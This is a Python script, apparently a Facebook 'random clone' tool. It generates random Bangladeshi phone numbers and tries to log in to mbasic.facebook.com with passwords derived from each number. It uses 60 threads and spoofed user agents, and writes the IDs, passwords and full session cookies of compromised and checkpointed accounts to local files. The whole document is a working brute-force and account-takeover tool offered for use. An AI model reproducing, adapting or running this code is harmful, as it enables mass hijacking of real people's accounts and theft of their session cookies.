#!/usr/bin/python3
#-*-coding:utf-8-*-
#!/usr/bin/python3
import os,time,random,string,re,sys,requests,json,uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
####$#######
B = '\x1b[1;90m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
H = '\x1b[1;93m'
BL = '\x1b[1;94m'
BG = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'
EX = '\x1b[0m'
E = '\33[m'
#########
ugen=[]
for xffd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
#-_-_-_--_-_-_-_-_6_-_6_-_-_6_6_6
#-$6$-_-$-$-$76$6$6$-$-$
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
#######$$
dt="•"
#########
ok=[]
cp=[]
lop=0
xode=[]
version="1.04"
def line():
	print("\033[38;5;46m────────────────────────────────────────")
def logo():
	os.system('clear');print(f"""
    ██████   █████  ██   ██ ██ ██████  
    ██   ██ ██   ██ ██  ██  ██ ██   ██ 
    ██████  ███████ █████   ██ ██████  
    ██   ██ ██   ██ ██  ██  ██ ██   ██ 
    ██   ██ ██   ██ ██   ██ ██ ██████  
\033[38;5;46m────────────────────────────────────────
\033[1;37m[\033[33;1m•\033[1;37m]\033[1;37m ADMIN    : MD RAKIB KING 
\033[1;37m[\033[33;1m•\033[1;37m]\033[1;37m GITHUB   : XXXX
\033[1;37m[\033[33;1m•\033[1;37m]\033[1;37m TOOL     : RANDOM CLONE
\033[1;37m[\033[33;1m•\033[1;37m]\033[1;37m VERSION  : TEST
\033[38;5;46m────────────────────────────────────────\033[1;37m""")
def Main():
	logo()
	print(f'{W}[\033[33;1m1{W}]{W} RANDOM CLONE');print(f'{W}[\033[33;1m2{W}]{W} CONTACT ADMIN');print(f'{W}[\033[33;1m3{W}]{W} FACEBOOK GROUP');print(f'{W}[\033[33;1m0{W}]{W} EXIT TOOL')
	line()
	gh=input(f'{W}[\033[33;1m?{W}]{W} CHOICE : ')
	if gh in ["1"]:
		kkkkk()
	elif gh in ["2"]:
		os.system('am start https://www.facebook.com/Toxic.boy.1433');time.sleep(5);Main()
	elif gh in ['3']:
		os.system('xdg-open https://facebook.com/groups/420862928067284/');time.sleep(5);Main()
	elif gh in ["0","E"]:
		me()
	else:
		line();print(f'\n \t{R}Choose valid option{E}');time.sleep(1);Main()
############random
def kkkkk():
	logo()
	print(f"{W}BD SIM CODE : {G}017 015 018 019 013 016{E}{W}");line()
	code=input(f'{W}[{G}+{E}] CHOICE : {G}');print(f"{G}────────────────────────────────────────")
	print(f'{W}EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W} ');line()
	limit=int(input(f'{E}[{G}+{E}] LIMIT : {G}'))
	for number in range(limit):
		numberx = ''.join(random.choice(string.digits) for _ in range(8))
		xode.append(numberx)
	with ThreadPool(max_workers=60) as tonxoys:
		tid= str(len(xode))
		logo();print(f'[{G}•{W}] TOTAL ID :\033[1;92m '+tid);print (f'{W}[{G}•{W}] \033[1;97mSIM CODE : \033[1;92m'+code);print(f'{W}[{G}•{W}] \033[1;37mAEROPLANE MODE [{G}ON{W}/{R}OF{W}] IN EVERY 5 MIN ');print(f"{G}────────────────────────────────────────")
		for rngx in xode:
			id=code+rngx
			psd=[id,rngx,id[:6],id[:7],id[:8],id[5:]]
			tonxoys.submit(nrmlrm,id,psd,tid)
##########random method
def nrmlrm(id,psd,tid):
	global ok,cp,lop
	session = requests.Session()
	ua=random.choice(ugen)
	for psw in psd:
		sys.stdout.write(f'\r\r{W}({G}FUCKING-M1{W}){E} {W}({G}{lop}{W}/{G}{tid}{W}){E} {W}{W}OK{W}:{G}%s{W}{E} '%(len(ok)));sys.stdout.flush()
		ffb = session.get(f'https://mbasic.facebook.com').text
		datax={"lsd":re.search('name="lsd" value="(.*?)"', str(ffb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(ffb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(ffb)).group(1),"li":re.search('name="li" value="(.*?)"', str(ffb)).group(1),"try_number":"0","unrecognized_tries":"0","email":id,"pass":psw,"login":"Log In"}
		header={'authority': 'mbasic.facebook.com','method': 'GET','path': '/','scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=E6roZBCBF8pc_91ZtZabYUfB; sb=E6roZCAZjGDtotLByepT9PWp; locale=en_GB; vpd=v1%3B591x313x2.3014395236968994; dpr=2.3014395236968994; wl_cbv=v2%3Bclient_version%3A2312%3Btimestamp%3A1693018685; m_pixel_ratio=2.3014395236968994; wd=313x591; fr=0ncbzO4w29hV98fB2.AWW_k4ksNr6UcW_iXeyUwHexFCw.Bk6KoT.UX.AAA.0.0.Bk6XDK.AWXnIIpLPqI',
    'dpr': '2',
    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AffHCczVHODNBc7SsBp0qciAAUWjxmwo5chuvNSCeiv8zvSUu5pYNFdy5lzembMbOhuJQA9At3Furc7QXA0PTIzK5h2aIJu0-NbawUKqLlXDhQ&smuh=60291&lh=Ac_7YQVYil9JBwqFwjk&wtsid=rdr_0NvWLXtwug2CDOUxF&ref_component=mbasic_footer&_rdr',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X688B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'viewport-width': '980',
    'user-agent': ua}
		lo = session.post(f'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=datax,headers=header).text
		lcki=session.cookies.get_dict().keys()
		if 'c_user' in lcki:
			coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
			iid = coki[151:166]
			print(f'\r\r{R}[{G}FUCK-OK{R}] {G}{iid} | {psw}{W}')
			#print(f'\r\r{R}[{G}COKI{R}]{W}: {G}{coki}{E}')
			ok.append(id)
			open('/sdcard/RAKIB-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			break
		elif 'checkpoint' in lcki:
			coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
			iid = coki[82:97]
			##print(f'\r\r{R}[{E}FUCK-CP{R}] {E}{iid} | {psw}{W}')
			ok.append(id)
			open('/sdcard/RAKIB-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1

Main()
